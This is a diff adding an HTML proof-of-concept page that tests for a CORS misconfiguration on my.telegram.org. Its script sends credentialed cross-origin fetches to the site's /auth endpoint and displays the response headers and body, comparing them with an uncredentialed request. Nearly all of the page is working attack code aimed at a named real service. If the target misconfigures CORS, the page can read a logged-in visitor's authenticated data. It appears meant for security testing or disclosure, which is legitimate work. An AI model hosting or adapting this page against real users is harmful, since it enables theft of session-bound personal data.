@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CORS Authenticated PoC — my.telegram.org</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 20px; }
+    pre { background:#111; color:#e6e6e6; padding:12px; border-radius:6px; overflow:auto; max-height:420px;}
+    .ok { color: #0a0; font-weight:700; }
+    .bad { color:#a00; font-weight:700; }
+    .hint { color:#666; font-size:0.9rem; margin-top:8px; }
+    button { margin-top:12px; padding:8px 12px; border-radius:6px; }
+  </style>
+</head>
+<body>
+  <h1>CORS Authenticated PoC — my.telegram.org</h1>
+  <p>This page demonstrates a credentialed cross-origin fetch. Open DevTools → Network & Console before running.</p>
+
+  <label>
+    Endpoint:
+    <input id="endpoint" style="width:85%" value="https://my.telegram.org/auth" />
+  </label>
+  <br/>
+  <label class="hint">Note: If you open this page while logged in to the target site, the fetch will include browser cookies.</label>
+  <div>
+    <button id="run">Run fetch (credentials: include)</button>
+    <button id="runNoCred">Run fetch (no credentials)</button>
+  </div>
+
+  <h3>Result</h3>
+  <div id="status" class="hint">Status: waiting</div>
+  <h4>Response headers</h4>
+  <pre id="headers">-</pre>
+  <h4>Response body (preview)</h4>
+  <pre id="body">-</pre>
+
+<script>
+document.getElementById('run').addEventListener('click', doFetchWithCreds);
+document.getElementById('runNoCred').addEventListener('click', doFetchNoCreds);
+
+async function doFetchWithCreds(){
+  const ep = document.getElementById('endpoint').value;
+  document.getElementById('status').innerText = 'Status: running (credentials included)';
+  document.getElementById('headers').innerText = '';
+  document.getElementById('body').innerText = '';
+  try {
+    const r = await fetch(ep, { method:'GET', mode:'cors', credentials:'include' });
+    document.getElementById('status').innerHTML = 'Status: ' + r.status + ' — <span class="' + (r.ok ? 'ok':'bad') + '">' + r.statusText + '</span>';
+    let hdrs = '';
+    for (const [k,v] of r.headers.entries()) hdrs += k + ': ' + v + '\n';
+    document.getElementById('headers').innerText = hdrs || '(no response headers)';
+    const ct = r.headers.get('content-type') || '';
+    if (ct.includes('json')) {
+      const j = await r.json();
+      document.getElementById('body').innerText = JSON.stringify(j, null, 2);
+    } else {
+      const text = await r.text();
+      document.getElementById('body').innerText = text.slice(0, 10000);
+    }
+    console.log('Fetch complete', r.status);
+  } catch(e){
+    document.getElementById('status').innerText = 'Fetch error: ' + e;
+    console.error(e);
+  }
+}
+
+async function doFetchNoCreds(){
+  const ep = document.getElementById('endpoint').value;
+  document.getElementById('status').innerText = 'Status: running (no credentials)';
+  document.getElementById('headers').innerText = '';
+  document.getElementById('body').innerText = '';
+  try {
+    const r = await fetch(ep, { method:'GET', mode:'cors', credentials:'omit' });
+    document.getElementById('status').innerText = 'Status: ' + r.status + ' — ' + r.statusText;
+    let hdrs = '';
+    for (const [k,v] of r.headers.entries()) hdrs += k + ': ' + v + '\n';
+    document.getElementById('headers').innerText = hdrs || '(no response headers)';
+    const ct = r.headers.get('content-type') || '';
+    if (ct.includes('json')) {
+      const j = await r.json();
+      document.getElementById('body').innerText = JSON.stringify(j, null, 2);
+    } else {
+      const text = await r.text();
+      document.getElementById('body').innerText = text.slice(0, 10000);
+    }
+  } catch(e){
+    document.getElementById('status').innerText = 'Fetch error: ' + e;
+    console.error(e);
+  }
+}
+</script>
+</body>
+</html>
